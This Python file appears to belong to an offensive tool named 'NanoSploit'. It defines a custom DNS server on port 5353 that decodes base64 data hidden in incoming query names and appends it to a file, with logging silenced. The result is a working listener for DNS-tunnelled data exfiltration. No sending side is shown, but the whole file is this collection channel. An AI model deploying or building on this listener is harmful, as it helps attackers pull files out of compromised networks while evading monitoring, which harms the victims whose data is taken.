from dnslib import DNSRecord, DNSHeader, A, RR
from dnslib.server import DNSServer, BaseResolver, DNSLogger
from base64 import b64decode


# Mutable globals
dns_handler = None


class NanoSploitResolver(BaseResolver):
    filename = None

    def resolve(self, request, _handler):
        # Get request fields
        qname = str(request.q.qname)
        qtype = request.q.qtype

        # Prepare reply packet
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)

        if self.filename:
            # If filename is defined then write to it
            if ".file" in qname:
                with open(self.filename, 'ab') as file:
                    file.write(b64decode(qname.replace(".file.", "")))
                reply.add_answer(RR(qname, qtype, rdata=A('1.1.1.1')))
            else:
                reply.add_answer(RR(qname, qtype, rdata=A('2.2.2.2')))
        else:
            # If not defined then no
            reply.add_answer(RR(qname, qtype, rdata=A('2.2.2.2')))

        # If 1.1.1.1 then success, if 2.2.2.2 bad request
        return reply


def init_dns_server():
    # Define our custom resolver
    resolver = NanoSploitResolver()

    # Set the logger function to a None function, so it doesn't print things on screen
    logger = DNSLogger(logf=lambda _: None)

    # Instantiate a DNS server
    server = DNSServer(resolver, port=5353, logger=logger)

    # Start server in background
    server.start_thread()
    print("📔 Started DNS server on port 5353")

    global dns_handler
    dns_handler = resolver
